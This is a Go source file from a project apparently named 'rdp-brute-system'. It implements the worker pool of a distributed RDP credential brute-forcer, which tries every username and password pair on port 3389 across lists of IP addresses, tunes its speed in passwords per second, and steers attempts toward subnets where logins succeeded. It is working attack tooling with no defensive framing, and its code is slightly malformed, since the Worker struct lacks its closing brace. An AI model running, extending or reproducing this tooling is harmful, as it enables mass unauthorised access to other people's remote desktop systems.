package worker

import (
	"context"
	"fmt"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"rdp-brute-system/client/rdp"
	"rdp-brute-system/shared/protocol"
)

// Worker manages a pool of goroutines to perform RDP checks with optimized concurrency.
type Worker struct {
	id               int
	taskQueue        chan protocol.Task
	resultQueue      chan rdp.Result
	wg               sync.WaitGroup
	numThreads       int32 // Atomic for dynamic adjustment
	ppsCounter       int64 // Atomic for thread-safe PPS counting
	lastPPSReset     time.Time
	ctx              context.Context
	cancel           context.CancelFunc
	batchSize        int
	batchTimeout     time.Duration
	resultBatch      []rdp.Result
	batchMutex       sync.Mutex
	backoffStrategy  BackoffStrategy
	metrics          *Metrics
	
	// Connection pooling and optimization
	connPool         *ConnectionPool
	adaptiveScaler   *AdaptiveScaler
	
	// Task tracking
	activeTasks      int32
	taskTracker      map[string]*TaskInfo
	taskMutex        sync.RWMutex
	
	// Dual-buffer system
	workBuffer       *DualWorkBuffer
	
	// Predictive task fetching
	taskPredictor    *TaskPredictor
	taskFetcher      TaskFetcherFunc
	
	// Idle time tracking
	idleMetrics      *IdleMetrics
	
	// Connection warming
	connWarmer       *ConnectionWarmer
	
	// Target prioritization
	targetPriority   *TargetPrioritizer

// DualWorkBuffer implements a dual-buffer system for zero idle time
type DualWorkBuffer struct {
	activeBuffer   *WorkBuffer
	loadingBuffer  *WorkBuffer
	mu             sync.RWMutex
	swapSignal     chan struct{}
	loadingDone    chan struct{}
}

// WorkBuffer holds tasks and work items
type WorkBuffer struct {
	tasks          []protocol.Task
	currentIndex   int
	totalWork      int
	mu             sync.Mutex
}

// TaskPredictor predicts when to fetch new tasks
type TaskPredictor struct {
	worker            *Worker
	avgTaskDuration   time.Duration
	completionRate    float64
	lastPrediction    time.Time
	mu                sync.RWMutex
}

// IdleMetrics tracks idle time
type IdleMetrics struct {
	totalIdleTime     time.Duration
	lastActiveTime    time.Time
	idleStartTime     time.Time
	isIdle            bool
	idleCount         int64
	mu                sync.RWMutex
}

// TaskFetcherFunc is a function that fetches new tasks
type TaskFetcherFunc func() ([]protocol.Task, error)

// TaskInfo tracks individual task progress
type TaskInfo struct {
	TaskID      string
	StartTime   time.Time
	Attempts    int64
	Successes   int64
	Completed   int64
	Total       int64
}

// ConnectionPool manages connection reuse and caching
type ConnectionPool struct {
	connections map[string]*ConnectionCache
	mu          sync.RWMutex
	maxAge      time.Duration
	maxConns    int
}

// ConnectionCache caches connection state for a specific host
type ConnectionCache struct {
	Host          string
	LastAttempt   time.Time
	FailureCount  int
	ProtocolHint  uint32
	ResponseTime  time.Duration
}

// AdaptiveScaler dynamically adjusts worker count based on system resources
type AdaptiveScaler struct {
	worker        *Worker
	minWorkers    int
	maxWorkers    int
	scaleInterval time.Duration
	cpuThreshold  float64
	memThreshold  float64
}

// BackoffStrategy defines the interface for backoff algorithms
type BackoffStrategy interface {
	Backoff(attempt int) time.Duration
	Reset()
}

// ExponentialBackoff implements exponential backoff with jitter
type ExponentialBackoff struct {
	baseDelay time.Duration
	maxDelay  time.Duration
	attempt   int
}

// NewExponentialBackoff creates a new exponential backoff strategy
func NewExponentialBackoff(baseDelay, maxDelay time.Duration) *ExponentialBackoff {
	return &ExponentialBackoff{
		baseDelay: baseDelay,
		maxDelay:  maxDelay,
	}
}

// Backoff calculates the delay for the current attempt
func (eb *ExponentialBackoff) Backoff(attempt int) time.Duration {
	delay := eb.baseDelay * time.Duration(1<<uint(attempt))
	if delay > eb.maxDelay {
		delay = eb.maxDelay
	}
	// Add jitter to prevent thundering herd
	jitter := time.Duration(float64(delay) * 0.1 * (float64(time.Now().UnixNano()%100) / 100.0))
	return delay + jitter
}

// Reset resets the backoff counter
func (eb *ExponentialBackoff) Reset() {
	eb.attempt = 0
}

// Metrics collects performance metrics
type Metrics struct {
	TotalAttempts      int64
	SuccessfulAttempts int64
	FailedAttempts     int64
	PPS                int64
	AvgResponseTime    time.Duration
	MaxResponseTime    time.Duration
	MinResponseTime    time.Duration
	mutex              sync.RWMutex
	startTime          time.Time
	
	// Extended metrics
	ConnectionReuse    int64
	FastFailures       int64
	TimeoutFailures    int64
}

// NewMetrics creates a new metrics collector
func NewMetrics() *Metrics {
	return &Metrics{
		startTime:       time.Now(),
		MinResponseTime: time.Hour,
	}
}

// RecordAttempt records an attempt with its response time
func (m *Metrics) RecordAttempt(success bool, responseTime time.Duration) {
	m.mutex.Lock()
	defer m.mutex.Unlock()
	
	atomic.AddInt64(&m.TotalAttempts, 1)
	if success {
		atomic.AddInt64(&m.SuccessfulAttempts, 1)
	} else {
		atomic.AddInt64(&m.FailedAttempts, 1)
	}
	
	if responseTime > m.MaxResponseTime {
		m.MaxResponseTime = responseTime
	}
	if responseTime < m.MinResponseTime {
		m.MinResponseTime = responseTime
	}
	
	// Calculate running average
	totalDuration := m.AvgResponseTime*time.Duration(m.TotalAttempts-1) + responseTime
	m.AvgResponseTime = totalDuration / time.Duration(m.TotalAttempts)
}

// GetStats returns current statistics
func (m *Metrics) GetStats() (int64, int64, int64, time.Duration) {
	m.mutex.RLock()
	defer m.mutex.RUnlock()
	return atomic.LoadInt64(&m.TotalAttempts), 
		   atomic.LoadInt64(&m.SuccessfulAttempts), 
		   atomic.LoadInt64(&m.FailedAttempts), 
		   m.AvgResponseTime
}

// NewConnectionPool creates a new connection pool
func NewConnectionPool(maxConns int, maxAge time.Duration) *ConnectionPool {
	return &ConnectionPool{
		connections: make(map[string]*ConnectionCache),
		maxConns:    maxConns,
		maxAge:      maxAge,
	}
}

// GetConnectionHint retrieves cached connection information
func (cp *ConnectionPool) GetConnectionHint(host string) *ConnectionCache {
	cp.mu.RLock()
	defer cp.mu.RUnlock()
	
	cache, exists := cp.connections[host]
	if !exists {
		return nil
	}
	
	// Check if cache is still valid
	if time.Since(cache.LastAttempt) > cp.maxAge {
		return nil
	}
	
	return cache
}

// UpdateConnectionCache updates the connection cache for a host
func (cp *ConnectionPool) UpdateConnectionCache(host string, success bool, protocol uint32, responseTime time.Duration) {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	
	cache, exists := cp.connections[host]
	if !exists {
		cache = &ConnectionCache{
			Host: host,
		}
		
		// Evict oldest entry if at capacity
		if len(cp.connections) >= cp.maxConns {
			var oldestHost string
			var oldestTime time.Time = time.Now()
			for h, c := range cp.connections {
				if c.LastAttempt.Before(oldestTime) {
					oldestHost = h
					oldestTime = c.LastAttempt
				}
			}
			delete(cp.connections, oldestHost)
		}
		
		cp.connections[host] = cache
	}
	
	cache.LastAttempt = time.Now()
	cache.ResponseTime = responseTime
	
	if success {
		cache.FailureCount = 0
		cache.ProtocolHint = protocol
	} else {
		cache.FailureCount++
	}
}

// NewAdaptiveScaler creates a new adaptive scaler
func NewAdaptiveScaler(worker *Worker, minWorkers, maxWorkers int) *AdaptiveScaler {
	return &AdaptiveScaler{
		worker:        worker,
		minWorkers:    minWorkers,
		maxWorkers:    maxWorkers,
		scaleInterval: 5 * time.Second,
		cpuThreshold:  80.0,
		memThreshold:  80.0,
	}
}

// Start begins the adaptive scaling routine
func (as *AdaptiveScaler) Start() {
	go as.scalingLoop()
}

// scalingLoop monitors system resources and adjusts worker count
func (as *AdaptiveScaler) scalingLoop() {
	ticker := time.NewTicker(as.scaleInterval)
	defer ticker.Stop()
	
	for {
		select {
		case <-as.worker.ctx.Done():
			return
		case <-ticker.C:
			as.adjustWorkers()
		}
	}
}

// adjustWorkers dynamically adjusts the number of workers
func (as *AdaptiveScaler) adjustWorkers() {
	currentWorkers := atomic.LoadInt32(&as.worker.numThreads)
	pps := atomic.LoadInt64(&as.worker.ppsCounter)
	activeTasks := atomic.LoadInt32(&as.worker.activeTasks)
	
	// Get CPU usage (simplified - in production use proper monitoring)
	numCPU := runtime.NumCPU()
	targetWorkers := currentWorkers
	
	// Scale up if high PPS and tasks are queued
	if pps > 500 && activeTasks > 0 && len(as.worker.taskQueue) > 0 {
		targetWorkers = currentWorkers + int32(numCPU/2)
	} else if pps < 100 && currentWorkers > int32(as.minWorkers) {
		// Scale down if low PPS
		targetWorkers = currentWorkers - int32(numCPU/4)
	}
	
	// Apply bounds
	if targetWorkers < int32(as.minWorkers) {
		targetWorkers = int32(as.minWorkers)
	} else if targetWorkers > int32(as.maxWorkers) {
		targetWorkers = int32(as.maxWorkers)
	}
	
	if targetWorkers != currentWorkers {
		as.worker.SetNumThreads(int(targetWorkers))
		fmt.Printf("Adaptive scaling: adjusted workers from %d to %d (PPS: %d, Active Tasks: %d)\n", 
			currentWorkers, targetWorkers, pps, activeTasks)
	}
}

// New creates a new worker with performance optimizations.
func New(id, numThreads int, taskQueue chan protocol.Task, resultQueue chan rdp.Result) *Worker {
	ctx, cancel := context.WithCancel(context.Background())
	
	// Calculate optimal worker count if not specified
	if numThreads <= 0 {
		numCPU := runtime.NumCPU()
		numThreads = numCPU * 50 // Much higher concurrency for network I/O bound tasks
		if numThreads < 100 {
			numThreads = 100 // Minimum 100 workers
		}
		if numThreads > 500 {
			numThreads = 500 // Cap at 500 to prevent resource exhaustion
		}
	}
	
	worker := &Worker{
		id:              id,
		taskQueue:       taskQueue,
		resultQueue:     resultQueue,
		numThreads:      int32(numThreads),
		lastPPSReset:    time.Now(),
		ctx:             ctx,
		cancel:          cancel,
		batchSize:       500, // Increased from 100
		batchTimeout:    50 * time.Millisecond, // Reduced from 100ms
		backoffStrategy: NewExponentialBackoff(50*time.Millisecond, 2*time.Second), // Reduced max backoff
		metrics:         NewMetrics(),
		connPool:        NewConnectionPool(10000, 5*time.Minute),
		taskTracker:     make(map[string]*TaskInfo),
		resultBatch:     make([]rdp.Result, 0, 500),
	}
	
	// Create adaptive scaler
	worker.adaptiveScaler = NewAdaptiveScaler(worker, 50, 500)
	
	// Initialize dual-buffer system
	worker.workBuffer = &DualWorkBuffer{
		activeBuffer:  NewWorkBuffer(),
		loadingBuffer: NewWorkBuffer(),
		swapSignal:    make(chan struct{}, 1),
		loadingDone:   make(chan struct{}, 1),
	}
	
	// Initialize task predictor
	worker.taskPredictor = &TaskPredictor{
		worker: worker,
	}
	
	// Initialize idle metrics
	worker.idleMetrics = &IdleMetrics{
		lastActiveTime: time.Now(),
	}
	
	// Initialize connection warmer
	worker.connWarmer = NewConnectionWarmer(worker)
	
	// Initialize target prioritizer
	worker.targetPriority = NewTargetPrioritizer()
	
	return worker
}

// NewWorkBuffer creates a new work buffer
func NewWorkBuffer() *WorkBuffer {
	return &WorkBuffer{
		tasks: make([]protocol.Task, 0, 10),
	}
}

// SetTaskFetcher sets the function to fetch new tasks
func (w *Worker) SetTaskFetcher(fetcher TaskFetcherFunc) {
	w.taskFetcher = fetcher
}

// Start begins the worker's processing loop.
func (w *Worker) Start() {
	// Start initial worker goroutines
	numThreads := atomic.LoadInt32(&w.numThreads)
	for i := 0; i < int(numThreads); i++ {
		w.wg.Add(1)
		go w.run(i)
	}

	// Start metrics collection
	go w.resetPPSCounter()
	
	// Start batch processor
	go w.processBatches()
	
	// Start adaptive scaling
	w.adaptiveScaler.Start()
	
	// Start task monitor
	go w.taskMonitor()
	
	// Start dual-buffer manager
	go w.bufferManager()
	
	// Start predictive task fetcher
	go w.predictiveTaskFetcher()
	
	// Start idle time monitor
	go w.idleTimeMonitor()
	
	// Start connection warmer
	w.connWarmer.Start()
	
	// Set CPU affinity if supported
	w.setCPUAffinity()
	
	fmt.Printf("Worker %d started with %d threads, dual-buffer system, and connection warming\n", w.id, numThreads)
}

// Stop gracefully shuts down the worker.
func (w *Worker) Stop() {
	w.cancel()
	
	// Wait for all goroutines to finish
	done := make(chan struct{})
	go func() {
		w.wg.Wait()
		close(done)
	}()
	
	select {
	case <-done:
		// Clean shutdown
		fmt.Printf("Worker %d stopped gracefully\n", w.id)
	case <-time.After(5 * time.Second):
		// Force shutdown after timeout
		fmt.Printf("Worker %d force shutdown after timeout\n", w.id)
	}
}

func (w *Worker) run(workerID int) {
	defer w.wg.Done()
	
	for {
		select {
		case <-w.ctx.Done():
			return
		default:
			// Try to get task from dual-buffer first
			task, ok := w.getNextTask()
			if ok {
				w.markActive()
				atomic.AddInt32(&w.activeTasks, 1)
				w.processTask(task, workerID)
				atomic.AddInt32(&w.activeTasks, -1)
			} else {
				// No task available, check regular queue
				select {
				case <-w.ctx.Done():
					return
				case task, ok := <-w.taskQueue:
					if !ok {
						return
					}
					w.markActive()
					atomic.AddInt32(&w.activeTasks, 1)
					w.processTask(task, workerID)
					atomic.AddInt32(&w.activeTasks, -1)
				case <-time.After(100 * time.Millisecond):
					// Brief wait to avoid spinning
					w.markIdle()
				}
			}
		}
	}
}

// getNextTask retrieves the next task from the dual-buffer
func (w *Worker) getNextTask() (protocol.Task, bool) {
	w.workBuffer.mu.RLock()
	buffer := w.workBuffer.activeBuffer
	w.workBuffer.mu.RUnlock()
	
	buffer.mu.Lock()
	defer buffer.mu.Unlock()
	
	if buffer.currentIndex >= len(buffer.tasks) {
		// Buffer exhausted, try to swap
		select {
		case w.workBuffer.swapSignal <- struct{}{}:
			// Signal sent to swap buffers
		default:
			// Swap already in progress
		}
		return protocol.Task{}, false
	}
	
	task := buffer.tasks[buffer.currentIndex]
	buffer.currentIndex++
	
	// Update predictor
	w.taskPredictor.updateProgress(buffer.currentIndex, len(buffer.tasks))
	
	return task, true
}

// markActive marks the worker as active
func (w *Worker) markActive() {
	w.idleMetrics.mu.Lock()
	defer w.idleMetrics.mu.Unlock()
	
	if w.idleMetrics.isIdle {
		// Calculate idle duration
		idleDuration := time.Since(w.idleMetrics.idleStartTime)
		w.idleMetrics.totalIdleTime += idleDuration
		w.idleMetrics.isIdle = false
		
		if idleDuration > 1*time.Second {
			fmt.Printf("Worker %d was idle for %v\n", w.id, idleDuration)
		}
	}
	
	w.idleMetrics.lastActiveTime = time.Now()
}

// markIdle marks the worker as idle
func (w *Worker) markIdle() {
	w.idleMetrics.mu.Lock()
	defer w.idleMetrics.mu.Unlock()
	
	if !w.idleMetrics.isIdle {
		w.idleMetrics.isIdle = true
		w.idleMetrics.idleStartTime = time.Now()
		atomic.AddInt64(&w.idleMetrics.idleCount, 1)
	}
}

func (w *Worker) processTask(task protocol.Task, workerID int) {
	// Track task progress
	w.taskMutex.Lock()
	taskInfo := &TaskInfo{
		TaskID:    task.ID,
		StartTime: time.Now(),
		Total:     int64(len(task.IPs) * len(task.Usernames) * len(task.Passwords)),
	}
	w.taskTracker[task.ID] = taskInfo
	w.taskMutex.Unlock()
	
	// Sort IPs by priority
	sortedIPs := w.targetPriority.SortByPriority(task.IPs)
	
	// Add high-priority targets to connection warmer
	for i, ip := range sortedIPs {
		if i < 10 { // Warm top 10 targets
			w.connWarmer.AddTarget(ip, 3389, 10-i)
		}
	}
	
	// Process with parallel IP scanning
	ipChan := make(chan string, len(sortedIPs))
	for _, ip := range sortedIPs {
		ipChan <- ip
	}
	close(ipChan)
	
	// Create sub-workers for this task
	var taskWg sync.WaitGroup
	subWorkers := 10 // Process 10 IPs concurrently per task
	if len(task.IPs) < subWorkers {
		subWorkers = len(task.IPs)
	}
	
	for i := 0; i < subWorkers; i++ {
		taskWg.Add(1)
		go func() {
			defer taskWg.Done()
			for ip := range ipChan {
				for _, username := range task.Usernames {
					for _, password := range task.Passwords {
						select {
						case <-w.ctx.Done():
							return
						default:
							w.processCredential(ip, username, password, task.ID)
						}
					}
				}
			}
		}()
	}
	
	taskWg.Wait()
	
	// Clean up task tracking
	w.taskMutex.Lock()
	delete(w.taskTracker, task.ID)
	w.taskMutex.Unlock()
}

func (w *Worker) processCredential(ip, username, password, taskID string) {
	startTime := time.Now()
	
	// Check if we have a warm connection available
	warmConn, protocolHint, hasWarm := w.connWarmer.GetWarmConnection(ip, 3389)
	
	// Check connection cache for hints
	connHint := w.connPool.GetConnectionHint(ip)
	
	// Skip if too many recent failures
	if connHint != nil && connHint.FailureCount > 10 {
		atomic.AddInt64(&w.metrics.FastFailures, 1)
		w.incrementPPS()
		return
	}
	
	// Apply target prioritization
	priority := w.targetPriority.GetPriority(ip)
	if priority < 0 {
		// Negative priority means skip this target
		atomic.AddInt64(&w.metrics.FastFailures, 1)
		w.incrementPPS()
		return
	}
	
	// Perform RDP check with optimizations
	var result rdp.Result
	
	if hasWarm && warmConn != nil {
		// Use warm connection
		warmConn.Close() // We got the protocol hint, close the test connection
		result = rdp.CheckWithProtocolHint(ip, 3389, username, password, protocolHint)
		atomic.AddInt64(&w.metrics.ConnectionReuse, 1)
	} else if connHint != nil && connHint.ProtocolHint > 0 {
		// Use cached protocol hint for faster connection
		result = rdp.CheckWithProtocolHint(ip, 3389, username, password, connHint.ProtocolHint)
		atomic.AddInt64(&w.metrics.ConnectionReuse, 1)
	} else {
		// Standard check with retry logic
		attempt := 0
		for {
			result = rdp.Check(ip, 3389, username, password)
			
			// If successful or max attempts reached, break
			if result.Success || attempt >= 1 { // Reduced retries from 3 to 1
				break
			}
			
			// Only retry on timeout errors
			if !isTimeoutError(result.Err) {
				break
			}
			
			// Apply backoff strategy
			backoffDuration := w.backoffStrategy.Backoff(attempt)
			select {
			case <-time.After(backoffDuration):
				attempt++
			case <-w.ctx.Done():
				return
			}
		}
	}
	
	responseTime := time.Since(startTime)
	w.metrics.RecordAttempt(result.Success, responseTime)
	
	// Update connection cache
	protocol := uint32(0) // Would be set by RDP check
	w.connPool.UpdateConnectionCache(ip, result.Success || isAuthFailure(result.Err), protocol, responseTime)
	
	// Update task progress
	w.taskMutex.RLock()
	if taskInfo, exists := w.taskTracker[taskID]; exists {
		atomic.AddInt64(&taskInfo.Attempts, 1)
		if result.Success {
			atomic.AddInt64(&taskInfo.Successes, 1)
		}
		atomic.AddInt64(&taskInfo.Completed, 1)
	}
	w.taskMutex.RUnlock()
	
	// Update target prioritizer with result
	w.targetPriority.UpdateResult(ip, result.Success, responseTime)
	
	// If successful, prioritize similar targets
	if result.Success {
		w.connWarmer.PrioritizeTargets([]string{ip})
		w.targetPriority.PrioritizeSubnet(ip)
	}
	
	w.batchResult(result)
	w.incrementPPS()
}

func (w *Worker) batchResult(result rdp.Result) {
	w.batchMutex.Lock()
	defer w.batchMutex.Unlock()
	
	w.resultBatch = append(w.resultBatch, result)
	
	if len(w.resultBatch) >= w.batchSize {
		w.flushBatch()
	}
}

func (w *Worker) flushBatch() {
	if len(w.resultBatch) == 0 {
		return
	}
	
	// Send batch to result queue with non-blocking sends
	successCount := 0
	for _, result := range w.resultBatch {
		select {
		case w.resultQueue <- result:
			if result.Success {
				successCount++
			}
		case <-w.ctx.Done():
			return
		default:
			// Result queue full, log and continue
			fmt.Printf("Warning: Result queue full, dropping %d results\n", len(w.resultBatch)-successCount)
			break
		}
	}
	
	if successCount > 0 {
		fmt.Printf("Flushed batch with %d successful results\n", successCount)
	}
	
	w.resultBatch = w.resultBatch[:0] // Clear batch
}

func (w *Worker) processBatches() {
	ticker := time.NewTicker(w.batchTimeout)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.ctx.Done():
			// Flush remaining batch before exit
			w.batchMutex.Lock()
			w.flushBatch()
			w.batchMutex.Unlock()
			return
		case <-ticker.C:
			w.batchMutex.Lock()
			w.flushBatch()
			w.batchMutex.Unlock()
		}
	}
}

func (w *Worker) incrementPPS() {
	atomic.AddInt64(&w.ppsCounter, 1)
}

// GetPPS returns the current passwords-per-second rate.
func (w *Worker) GetPPS() int {
	return int(atomic.LoadInt64(&w.ppsCounter))
}

func (w *Worker) resetPPSCounter() {
	for {
		select {
		case <-w.ctx.Done():
			return
		case <-time.After(1 * time.Second):
			currentPPS := atomic.SwapInt64(&w.ppsCounter, 0)
			atomic.StoreInt64(&w.metrics.PPS, currentPPS)
		}
	}
}

// taskMonitor periodically logs task progress
func (w *Worker) taskMonitor() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.ctx.Done():
			return
		case <-ticker.C:
			w.taskMutex.RLock()
			for taskID, info := range w.taskTracker {
				completed := atomic.LoadInt64(&info.Completed)
				total := info.Total
				progress := float64(completed) / float64(total) * 100
				pps := float64(completed) / time.Since(info.StartTime).Seconds()
				
				fmt.Printf("Task %s: %.1f%% complete (%d/%d) - %.0f checks/sec\n", 
					taskID, progress, completed, total, pps)
			}
			w.taskMutex.RUnlock()
		}
	}
}

// SetNumThreads adjusts the number of concurrent goroutines.
func (w *Worker) SetNumThreads(num int) {
	currentThreads := int(atomic.LoadInt32(&w.numThreads))
	
	if num > currentThreads {
		// Add new workers
		for i := 0; i < num-currentThreads; i++ {
			w.wg.Add(1)
			go w.run(currentThreads + i)
		}
	}
	// Note: We don't reduce workers to avoid complexity
	// They will naturally exit when there's no work
	
	atomic.StoreInt32(&w.numThreads, int32(num))
	fmt.Printf("Worker %d threads adjusted to %d (was %d)\n", w.id, num, currentThreads)
}

// GetMetrics returns the current metrics
func (w *Worker) GetMetrics() *Metrics {
	return w.metrics
}

// SetBatchSize configures the batch size for result processing
func (w *Worker) SetBatchSize(size int) {
	w.batchSize = size
}

// SetBatchTimeout configures the timeout for batch flushing
func (w *Worker) SetBatchTimeout(timeout time.Duration) {
	w.batchTimeout = timeout
}

// SetBackoffStrategy configures the backoff strategy
func (w *Worker) SetBackoffStrategy(strategy BackoffStrategy) {
	w.backoffStrategy = strategy
}

// isTimeoutError checks if the error is a timeout
func isTimeoutError(err error) bool {
	if err == nil {
		return false
	}
	// Check for common timeout error patterns
	errStr := err.Error()
	return contains(errStr, "timeout") || contains(errStr, "deadline exceeded")
}

// isAuthFailure checks if error indicates authentication failure
func isAuthFailure(err error) bool {
	if err == nil {
		return false
	}
	
	authErrors := []string{
		"authentication failed",
		"NLA authentication failed",
		"invalid credentials",
		"logon failure",
		"access denied",
	}
	
	errStr := err.Error()
	for _, authErr := range authErrors {
		if contains(errStr, authErr) {
			return true
		}
	}
	return false
}

// contains checks if string contains substring
func contains(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// bufferManager manages the dual-buffer system
func (w *Worker) bufferManager() {
	for {
		select {
		case <-w.ctx.Done():
			return
		case <-w.workBuffer.swapSignal:
			w.swapBuffers()
		}
	}
}

// swapBuffers swaps the active and loading buffers
func (w *Worker) swapBuffers() {
	w.workBuffer.mu.Lock()
	
	// Wait for loading to complete if necessary
	select {
	case <-w.workBuffer.loadingDone:
		// Loading completed
	case <-time.After(100 * time.Millisecond):
		// Don't wait too long
		w.workBuffer.mu.Unlock()
		return
	}
	
	// Swap buffers
	w.workBuffer.activeBuffer, w.workBuffer.loadingBuffer =
		w.workBuffer.loadingBuffer, w.workBuffer.activeBuffer
	
	// Reset the new loading buffer
	w.workBuffer.loadingBuffer.mu.Lock()
	w.workBuffer.loadingBuffer.tasks = w.workBuffer.loadingBuffer.tasks[:0]
	w.workBuffer.loadingBuffer.currentIndex = 0
	w.workBuffer.loadingBuffer.totalWork = 0
	w.workBuffer.loadingBuffer.mu.Unlock()
	
	w.workBuffer.mu.Unlock()
	
	// Start loading new tasks into the loading buffer
	go w.loadTasksIntoBuffer()
}

// loadTasksIntoBuffer loads tasks into the loading buffer
func (w *Worker) loadTasksIntoBuffer() {
	if w.taskFetcher == nil {
		// Fallback to regular task queue
		select {
		case task := <-w.taskQueue:
			w.workBuffer.mu.RLock()
			buffer := w.workBuffer.loadingBuffer
			w.workBuffer.mu.RUnlock()
			
			buffer.mu.Lock()
			buffer.tasks = append(buffer.tasks, task)
			buffer.totalWork = len(buffer.tasks)
			buffer.mu.Unlock()
			
			// Signal loading done
			select {
			case w.workBuffer.loadingDone <- struct{}{}:
			default:
			}
		case <-time.After(500 * time.Millisecond):
			// Timeout waiting for tasks
		}
		return
	}
	
	// Use task fetcher to get multiple tasks
	tasks, err := w.taskFetcher()
	if err != nil {
		fmt.Printf("Worker %d: Error fetching tasks: %v\n", w.id, err)
		return
	}
	
	if len(tasks) > 0 {
		w.workBuffer.mu.RLock()
		buffer := w.workBuffer.loadingBuffer
		w.workBuffer.mu.RUnlock()
		
		buffer.mu.Lock()
		buffer.tasks = append(buffer.tasks, tasks...)
		buffer.totalWork = len(buffer.tasks)
		buffer.mu.Unlock()
		
		fmt.Printf("Worker %d: Loaded %d tasks into buffer\n", w.id, len(tasks))
	}
	
	// Signal loading done
	select {
	case w.workBuffer.loadingDone <- struct{}{}:
	default:
	}
}

// predictiveTaskFetcher predicts when to fetch new tasks
func (w *Worker) predictiveTaskFetcher() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.ctx.Done():
			return
		case <-ticker.C:
			w.checkAndFetchTasks()
		}
	}
}

// checkAndFetchTasks checks if new tasks should be fetched
func (w *Worker) checkAndFetchTasks() {
	// Get current buffer status
	w.workBuffer.mu.RLock()
	activeBuffer := w.workBuffer.activeBuffer
	loadingBuffer := w.workBuffer.loadingBuffer
	w.workBuffer.mu.RUnlock()
	
	// Check active buffer progress
	activeBuffer.mu.Lock()
	activeProgress := float64(activeBuffer.currentIndex) / float64(len(activeBuffer.tasks))
	activeRemaining := len(activeBuffer.tasks) - activeBuffer.currentIndex
	activeBuffer.mu.Unlock()
	
	// Check loading buffer status
	loadingBuffer.mu.Lock()
	loadingCount := len(loadingBuffer.tasks)
	loadingBuffer.mu.Unlock()
	
	// Predict when we'll need new tasks
	pps := float64(atomic.LoadInt64(&w.ppsCounter))
	if pps > 0 && activeRemaining > 0 {
		timeToExhaust := float64(activeRemaining) / pps
		
		// If we'll exhaust in less than 5 seconds and loading buffer is empty
		if timeToExhaust < 5.0 && loadingCount == 0 {
			fmt.Printf("Worker %d: Predictive fetch triggered (%.1fs to exhaust, %d remaining)\n",
				w.id, timeToExhaust, activeRemaining)
			go w.loadTasksIntoBuffer()
		}
	}
	
	// Also trigger if active buffer is more than 70% complete
	if activeProgress > 0.7 && loadingCount == 0 {
		go w.loadTasksIntoBuffer()
	}
}

// updateProgress updates task predictor progress
func (tp *TaskPredictor) updateProgress(current, total int) {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	
	if total > 0 {
		progress := float64(current) / float64(total)
		now := time.Now()
		
		if tp.lastPrediction.IsZero() {
			tp.lastPrediction = now
		} else {
			// Calculate completion rate
			elapsed := now.Sub(tp.lastPrediction).Seconds()
			if elapsed > 0 {
				tp.completionRate = progress / elapsed
			}
		}
		
		// Update average task duration
		if current > 0 {
			taskDuration := now.Sub(tp.lastPrediction) / time.Duration(current)
			if tp.avgTaskDuration == 0 {
				tp.avgTaskDuration = taskDuration
			} else {
				// Weighted average
				tp.avgTaskDuration = (tp.avgTaskDuration*9 + taskDuration) / 10
			}
		}
		
		tp.lastPrediction = now
	}
}

// idleTimeMonitor monitors and reports idle time
func (w *Worker) idleTimeMonitor() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.ctx.Done():
			return
		case <-ticker.C:
			w.reportIdleMetrics()
		}
	}
}

// reportIdleMetrics reports idle time metrics
func (w *Worker) reportIdleMetrics() {
	w.idleMetrics.mu.RLock()
	totalIdle := w.idleMetrics.totalIdleTime
	idleCount := atomic.LoadInt64(&w.idleMetrics.idleCount)
	isIdle := w.idleMetrics.isIdle
	w.idleMetrics.mu.RUnlock()
	
	if isIdle {
		// Add current idle period
		w.idleMetrics.mu.RLock()
		currentIdleDuration := time.Since(w.idleMetrics.idleStartTime)
		w.idleMetrics.mu.RUnlock()
		totalIdle += currentIdleDuration
	}
	
	// Calculate idle percentage
	uptime := time.Since(w.metrics.startTime)
	idlePercentage := float64(totalIdle) / float64(uptime) * 100
	
	if idlePercentage > 5.0 { // More than 5% idle is concerning
		fmt.Printf("Worker %d idle metrics: %.1f%% idle time (%v total, %d idle periods)\n",
			w.id, idlePercentage, totalIdle, idleCount)
	}
}

// GetIdleMetrics returns current idle metrics
func (w *Worker) GetIdleMetrics() (totalIdleTime time.Duration, idlePercentage float64) {
	w.idleMetrics.mu.RLock()
	totalIdle := w.idleMetrics.totalIdleTime
	isIdle := w.idleMetrics.isIdle
	idleStart := w.idleMetrics.idleStartTime
	w.idleMetrics.mu.RUnlock()
	
	if isIdle {
		// Add current idle period
		totalIdle += time.Since(idleStart)
	}
	
	uptime := time.Since(w.metrics.startTime)
	percentage := float64(totalIdle) / float64(uptime) * 100
	
	return totalIdle, percentage
}

// GetBufferStatus returns the current buffer status
func (w *Worker) GetBufferStatus() map[string]interface{} {
	w.workBuffer.mu.RLock()
	activeBuffer := w.workBuffer.activeBuffer
	loadingBuffer := w.workBuffer.loadingBuffer
	w.workBuffer.mu.RUnlock()
	
	activeBuffer.mu.Lock()
	activeStatus := map[string]interface{}{
		"tasks":        len(activeBuffer.tasks),
		"current":      activeBuffer.currentIndex,
		"remaining":    len(activeBuffer.tasks) - activeBuffer.currentIndex,
		"progress":     float64(activeBuffer.currentIndex) / float64(len(activeBuffer.tasks)) * 100,
	}
	activeBuffer.mu.Unlock()
	
	loadingBuffer.mu.Lock()
	loadingStatus := map[string]interface{}{
		"tasks": len(loadingBuffer.tasks),
	}
	loadingBuffer.mu.Unlock()
	
	return map[string]interface{}{
		"active_buffer":  activeStatus,
		"loading_buffer": loadingStatus,
		"active_tasks":   atomic.LoadInt32(&w.activeTasks),
	}
}
